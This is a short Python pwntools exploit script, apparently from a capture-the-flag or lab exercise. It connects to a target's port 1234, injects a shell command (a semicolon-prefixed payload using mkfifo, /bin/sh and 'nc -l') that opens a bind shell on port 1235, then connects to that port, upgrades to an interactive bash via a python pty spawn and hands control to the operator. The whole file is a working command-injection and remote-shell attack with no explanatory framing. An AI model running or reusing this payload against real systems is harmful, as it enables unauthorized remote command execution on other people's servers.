#!/usr/bin/python
from pwn import *

import sys
import socket
import base64
import select
from time import sleep

if len(sys.argv) != 2:
	print "Usage: ./{prog_name} ip_addr".format(prog_name=sys.argv[0])
	print "ip_addr is the address of server you want to connect to"
	exit(0)

# get ip
ip = sys.argv[1]
port = 1234
bind_port = 1235

conn = remote(ip, port)
conn.sendline("can I haz shell pls??") # read public conversation
conn.sendline(";rm -rf /tmp/f;mkfifo /tmp/f;chmod +rw /tmp/f;cat /tmp/f | /bin/sh | nc -l {rev} > /tmp/f; echo\\".format(rev=bind_port))
conn.close()

sleep(1)
shell = remote(ip, bind_port)
shell.sendline("python -c 'import pty;pty.spawn(\"/bin/bash\")'")
shell.interactive()
shell.close()
